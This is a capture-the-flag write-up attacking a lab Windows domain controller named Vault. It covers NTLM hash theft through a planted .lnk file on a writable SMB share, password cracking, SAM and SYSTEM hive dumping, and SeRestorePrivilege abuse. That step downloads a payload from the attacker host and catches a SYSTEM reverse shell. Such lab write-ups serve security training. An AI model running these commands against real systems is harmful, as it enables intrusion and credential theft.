# CTF Writeup: Vault

---


## Reconaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -A -p- --min-rate 10000 192.168.126.172                                        
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-25 08:40 -0500
Nmap scan report for 192.168.126.172
Host is up (0.033s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-25 13:41:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-25T13:42:54+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2026-01-24T05:40:04
|_Not valid after:  2026-07-26T05:40:04
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-25T13:42:14+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-25T13:42:18
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   27.98 ms 192.168.45.1
2   27.86 ms 192.168.45.254
3   28.13 ms 192.168.251.1
4   28.74 ms 192.168.126.172

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.64 seconds
```

LDAP revealed an interesting domain, let's map it to our target in our local dns file.

```
sudo echo "192.168.126.172 vault.offsec" | sudo tee -a /etc/hosts
```

Since we now got an domain, we could utilize kerberos protocol in order to enumerate users. We identified that the guest user was activated.

```
./kerbrute userenum -d vault.offsec --dc 192.168.126.172 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/25/26 - Ronnie Flathers @ropnop

2026/01/25 08:51:11 >  Using KDC(s):
2026/01/25 08:51:11 >   192.168.126.172:88

2026/01/25 08:51:11 >  [+] VALID USERNAME:       guest@vault.offsec
2026/01/25 08:51:11 >  [+] VALID USERNAME:       administrator@vault.offsec
```

Enumerated SMB Shared anonymously.

```
smbclient -L \\\\vault.offsec                                    
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DocumentsShare  Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to vault.offsec failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

In the only custom share "DocumentsShare" are no files stored, maybe we got write permissions to it?

```
smbclient \\\\vault.offsec/DocumentsShare
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Nov 19 03:59:02 2021
  ..                                  D        0  Fri Nov 19 03:59:02 2021

                7706623 blocks of size 4096. 709125 blocks available
smb: \>
```

It worked! 

```
smbclient \\\\vault.offsec/DocumentsShare
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> put test.txt 
putting file test.txt as \test.txt (0.0 kB/s) (average 0.0 kB/s)
smb: \> ls
  .                                   D        0  Sun Jan 25 08:58:41 2026
  ..                                  D        0  Sun Jan 25 08:58:41 2026
  test.txt                            A        3  Sun Jan 25 08:58:41 2026

                7706623 blocks of size 4096. 712177 blocks available
```

We could perform NTLM Theft.

1. To create malicious file, I used to use ntlm_theft.

```
git clone https://github.com/Greenwolf/ntlm_theft.git
```

2. Create an .lnk file which connects to our local ip.

```
python3 ntlm_theft.py -g uri -s 192.168.45.220 -f vault
```

3. Start up our smb server via impacket-smbserver OR responder

```
impacket-smbserver hack . -smb2support                                                                                                 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

If it doesn't work use responder.

```
responder -I tun0
```

4. Put our malicious file into the smb share.

```
smbclient \\\\vault.offsec/DocumentsShare
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> put vault.lnk 
putting file vault.lnk as \vault.lnk (27.4 kB/s) (average 27.4 kB/s)
```

Retrieved NTLM Hash.

```
[SMB] NTLMv2-SSP Client   : 192.168.126.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:df454169adb231b5:A4140F1A2BE91481804705DEC9287D73:010100000000000000F3BC28DE8DDC016E121B38345EBEA100000000020008005300520034004A0001001E00570049004E002D00300043005500570048004C004300390036005800320004003400570049004E002D00300043005500570048004C00430039003600580032002E005300520034004A002E004C004F00430041004C00030014005300520034004A002E004C004F00430041004C00050014005300520034004A002E004C004F00430041004C000700080000F3BC28DE8DDC01060004000200000008003000300000000000000001000000002000003481C105AABBDED8CF47612E7D057ED3B21F862780FA890B3DBE48A0FF2196D40A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320030000000000000000000 
```

Stored the NTLM Hash locally and bruteforced an password utilizing john the ripper.

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
SecureHM         (anirudh)     
1g 0:00:00:06 DONE (2026-01-25 09:42) 0.1519g/s 1612Kp/s 1612Kc/s 1612KC/s Seifer@14..Sarahmasri
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Since we now got plain-text credentials we can do many things.

We tested if rdp'ing into the box was possible, but this didn't work.

I then tested if we can abuse WinRM in order to login.

```
nxc winrm 192.168.126.172 -u anirudh -p 'SecureHM'
WINRM       192.168.126.172 5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:vault.offsec)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.126.172 5985   DC               [+] vault.offsec\anirudh:SecureHM (Pwn3d!)
```

It told us "(Pwn3d!)" which means we can abuse evil-winrm in order to login.

```
evil-winrm -i 192.168.126.172 -u anirudh -p 'SecureHM'
```

Retrieved local.txt in C:\Users\anirudh\Desktop.

```
9a7e9a0242c05c4a310fa19a0c8f04a3
```

Identified that "SeBackupPrivilege" is enabled.

```
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
*Evil-WinRM* PS C:\>
```

Accessed registry hive and retrieved SYSTEM & SAM File.

```
*Evil-WinRM* PS C:\Users\anirudh\Documents> reg save hklm\sam C:\users\anirudh\sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\anirudh\Documents> reg save hklm\system C:\users\anirudh\system.hive
The operation completed successfully.
```

Downloaded both locally.

```
download system.hive
download sam.hive
```

Dumped SAM & System Files and retrieved Administrator Hash.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system system.hive -sam sam.hive local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:608339ddc8f434ac21945e026887dc36:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

But we fail on connecting to the machine with the Administrator User, I'm assuming because it is blocked.

There is also an Privilege open for user "anirudh" called "SeRestorePrivilege" which we can abuse by uploading an crafted reverse shell and an .exe file from github.

Downloaded the reverse shell script onto the target system.

```
*Evil-WinRM* PS C:\Temp> iwr -uri http://192.168.45.220/shell.exe -OutFile shell.exe
```

Downloaded .exe file which abuses the privilege.

```
*Evil-WinRM* PS C:\Temp> iwr -uri http://192.168.45.220/SeRestoreAbuse.exe -OutFile SeRestoreAbuse.exe
```

Started up listener on port 88.

```
nc -lvnp 88
```

```
*Evil-WinRM* PS C:\Temp> .\SeRestoreAbuse.exe C:\TEmp\shell.exe
RegCreateKeyExA result: 0
RegSetValueExA result: 0
```

Gained RCE as user "nt authority\system".

```
nc -lvnp 88  
listening on [any] 88 ...
connect to [192.168.45.220] from (UNKNOWN) [192.168.126.172] 51998
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Retrieved proof.txt in C:\Users\Administrator\Desktop.

```
93738fc0739e62f5ca31e70fff9b94cb
```
